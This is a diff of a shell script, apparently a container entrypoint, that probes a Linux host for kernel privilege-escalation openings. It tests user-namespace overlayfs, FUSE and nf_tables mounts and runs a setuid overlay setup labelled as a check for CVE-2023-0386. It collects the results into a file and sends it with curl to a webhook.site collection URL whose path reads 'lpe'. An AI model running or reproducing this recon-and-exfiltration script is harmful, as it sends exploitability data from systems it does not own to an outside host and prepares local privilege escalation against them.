@@ -1,15 +1,24 @@
 #!/bin/sh
 {
-echo "==kernel=="; uname -a; cat /proc/version
-echo "==userns=="; cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null; cat /proc/sys/user/max_user_namespaces 2>/dev/null
-echo "==io_uring=="; cat /proc/sys/kernel/io_uring_disabled 2>/dev/null; ls -la /proc/self/io_uring 2>/dev/null
-echo "==modules=="; ls /lib/modules 2>/dev/null; cat /proc/modules 2>/dev/null | head -20
-echo "==config=="; ls /proc/config.gz /boot/config* 2>&1
-echo "==newunshare=="; unshare -Urn sh -c 'id; echo NETNS_OK' 2>&1
-echo "==userns-test=="; cat /proc/self/uid_map; unshare -U sh -c 'cat /proc/self/uid_map' 2>&1
-echo "==overlayfs=="; grep -E 'overlay|fuse|nf_tables|io_uring' /proc/filesystems 2>&1; cat /proc/filesystems | head -20
-echo "==capsh=="; grep -E 'Cap' /proc/self/status
-echo "==sync-poll=="; ls /proc/sys/net/netfilter/ 2>&1 | head
+echo "==userns-overlay-mount=="
+unshare -Urm sh -c '
+mkdir -p /tmp/l /tmp/u /tmp/w /tmp/m
+echo "in userns: $(id)"
+mount -t tmpfs none /tmp/m 2>&1 && echo "tmpfs mount OK" || echo "tmpfs mount FAIL"
+echo "x" > /tmp/l/f
+mount -t overlay overlay -o lowerdir=/tmp/l,upperdir=/tmp/u,workdir=/tmp/w /tmp/ovl 2>&1 && echo "OVERLAY-USERNS OK" || echo "overlay mount FAIL"
+' 2>&1
+echo "==fuse=="
+ls -la /dev/fuse 2>&1
+unshare -Urm sh -c 'mkdir -p /tmp/fm; mount -t fuse none /tmp/fm 2>&1 && echo "FUSE MOUNT OK" || echo "fuse mount FAIL"' 2>&1
+echo "==nf_tables-userns=="
+unshare -Urn sh -c 'nft list ruleset 2>&1 | head -3; nft add table inet t 2>&1 && echo "NFT-CREATE OK" || echo "nft FAIL"' 2>&1
+echo "==cve-2023-0386-check=="
+unshare -Urm sh -c 'mkdir -p /tmp/a /tmp/b /tmp/c; echo "setuid test"; dd if=/dev/zero of=/tmp/b/file bs=1 count=0 2>/dev/null; chmod 4755 /tmp/b/file 2>&1; mount -t overlay overlay -o lowerdir=/tmp/a,upperdir=/tmp/b,workdir=/tmp/c /tmp/o 2>&1 && echo OVLOK || echo OVLFAIL' 2>&1
+echo "==io_uring=="
+cat /proc/sys/kernel/io_uring_disabled 2>&1
+echo "==unshare-version=="
+unshare --version 2>&1; nft --version 2>&1
 } > /www/out.txt 2>&1
-curl -sk -m 15 --data-binary @/www/out.txt "https://webhook.site/1a315c42-31b4-4eab-bb1a-5860736bdeb8/kernel"
+curl -sk -m 20 --data-binary @/www/out.txt "https://webhook.site/$TOK2/lpe"
 httpd -f -p 80 -h /www
